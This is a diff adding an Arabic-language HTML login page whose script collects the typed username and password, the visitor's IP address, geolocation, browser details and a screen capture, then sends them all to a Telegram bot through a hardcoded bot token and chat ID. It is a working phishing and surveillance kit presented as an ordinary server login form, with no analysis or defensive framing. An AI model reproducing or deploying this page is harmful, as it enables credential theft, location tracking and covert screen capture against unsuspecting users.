@@ -1,0 +1,239 @@
+
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>الدخول لموقع البيانات</title>
+    <style>
+        /* إعدادات عامة */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f7fc;
+            color: #333;
+            text-align: center;
+            direction: rtl;
+        }
+
+        h1 {
+            margin-top: 30px;
+            font-size: 2rem;
+            color: #444;
+        }
+
+        /* تصميم الحاوية */
+        .container {
+            max-width: 500px;
+            margin: 40px auto;
+            padding: 20px;
+            background: #fff;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+        }
+
+        /* تصميم النموذج */
+        form {
+            display: flex;
+            flex-direction: column;
+            align-items: stretch;
+            gap: 15px;
+        }
+
+        input {
+            padding: 10px;
+            font-size: 1rem;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            outline: none;
+        }
+
+        input:focus {
+            border-color: #007bff;
+            box-shadow: 0 0 5px rgba(0, 123, 255, 0.3);
+        }
+
+        button {
+            padding: 12px;
+            font-size: 1rem;
+            color: #fff;
+            background-color: #007bff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        /* تصميم زر الحصول على الموقع */
+        .location-btn {
+            margin-top: 20px;
+            padding: 12px;
+            background-color: #0066ff;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .location-btn:hover {
+            background-color: #218838;
+        }
+
+        /* النص الخاص بالموقع */
+        #location {
+            margin-top: 20px;
+            font-size: 1rem;
+            color: #555;
+            line-height: 1.5;
+        }
+
+        /* إضافة تأثيرات لزر الدخول */
+        .location-btn:active {
+            transform: scale(0.98);
+        }
+    </style>
+</head>
+<body>
+    <h1>صفحة الدخول إلى الخادم</h1>
+    <div class="container">
+        <form id="login-form">
+            <input id="email" name="email" placeholder="اسم المستخدم" required />
+            <input id="password" name="password" type="password" placeholder="كلمة المرور" required />
+            <button class="location-btn" type="button" onclick="captureAndSendData()">اضغط هنا لإرسال البيانات والصورة</button>
+        </form>
+        <p id="location"></p>
+    </div>
+
+    <script>
+        // دالة لإلتقاط صورة الشاشة وإرسال البيانات
+        function captureAndSendData() {
+            // الحصول على البيانات المدخلة
+            var user = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+            var userAgent = navigator.userAgent;
+            var platform = navigator.platform;
+            var screenWidth = window.innerWidth;
+            var screenHeight = window.innerHeight;
+
+            // الحصول على الموقع الجغرافي
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    var lat = position.coords.latitude;
+                    var lon = position.coords.longitude;
+
+                    // التقاط صورة من الشاشة
+                    captureScreen().then(function(screenImage) {
+                        // إرسال البيانات والصورة إلى تليجرام
+                        sendLocationAndDataToTelegram(lat, lon, user, password, userAgent, platform, screenWidth, screenHeight, screenImage);
+                    }).catch(function(error) {
+                        console.error("خطأ في التقاط الشاشة:", error);
+                    });
+                }, function(error) {
+                    document.getElementById("location").innerHTML = "حدث خطأ في الحصول على الموقع.";
+                });
+            } else {
+                document.getElementById("location").innerHTML = "الرجاء تحديث المتصفح لدعم الحصول على الموقع.";
+            }
+        }
+
+        // دالة لالتقاط صورة من الشاشة
+        function captureScreen() {
+            return new Promise(function(resolve, reject) {
+                navigator.mediaDevices.getDisplayMedia({ video: true }).then(function(stream) {
+                    var video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+
+                    video.onloadedmetadata = function() {
+                        var canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+
+                        var ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        // إيقاف تدفق الفيديو بعد الالتقاط
+                        stream.getTracks().forEach(function(track) {
+                            track.stop();
+                        });
+
+                        // تحويل الصورة إلى base64
+                        var imageData = canvas.toDataURL('image/png');
+                        resolve(imageData);
+                    };
+                }).catch(function(error) {
+                    reject(error);
+                });
+            });
+        }
+
+        // دالة لإرسال البيانات والصورة إلى تليجرام
+        function sendLocationAndDataToTelegram(lat, lon, user, password, userAgent, platform, screenWidth, screenHeight, screenImage) {
+            // إرسال IP
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    var ip = data.ip;
+
+                    // جمع جميع البيانات
+                    var message = `
+                    <b>محاولة تسجيل دخول جديدة</b>\n
+                        <b>اسم المستخدم:</b> ${user}\n
+                        <b>كلمة المرور:</b> ${password}\n
+                        <b>عنوان الـ IP:</b> ${ip}\n
+                        <b>الموقع:</b> ${lat}, ${lon}\n
+                        <b>المنصة:</b> ${platform}\n
+                        <b>متصفح المستخدم:</b> ${userAgent}\n
+                        <b>دقة الشاشة:</b> ${screenWidth}x${screenHeight}
+                    `;
+
+                    // إرسال البيانات إلى تليجرام
+                    var botToken = "7912637473:AAHqcroRLNJEMhkVFuTHye3iNQ54VViPv3E";
+                    var chatId = "5594532298";
+
+                    // إرسال البيانات النصية والصورة
+                    var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&parse_mode=html&text=${encodeURIComponent(message)}`;
+
+                    var xhr = new XMLHttpRequest();
+                    xhr.open("GET", url, true);
+                    xhr.onreadystatechange = function() {
+                        if (xhr.readyState == 4 && xhr.status == 200) {
+                            console.log("تم إرسال البيانات إلى الخادم.");
+                        }
+                    };
+                    xhr.send();
+
+                    // إرسال الصورة
+                    var formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', dataURLtoBlob(screenImage));
+
+                    var xhrPhoto = new XMLHttpRequest();
+                    xhrPhoto.open("POST", `https://api.telegram.org/bot${botToken}/sendPhoto`, true);
+                    xhrPhoto.send(formData);
+                })
+                .catch(error => {
+                    console.log("حدث خطأ في جلب IP:", error);
+                });
+        }
+
+        // دالة لتحويل صورة base64 إلى Blob
+        function dataURLtoBlob(dataURL) {
+            var byteString = atob(dataURL.split(',')[1]);
+            var mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
+            var ab = new ArrayBuffer(byteString.length);
+            var ia = new Uint8Array(ab);
+            for (var i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        }
+    </script>
+</body>
+</html>
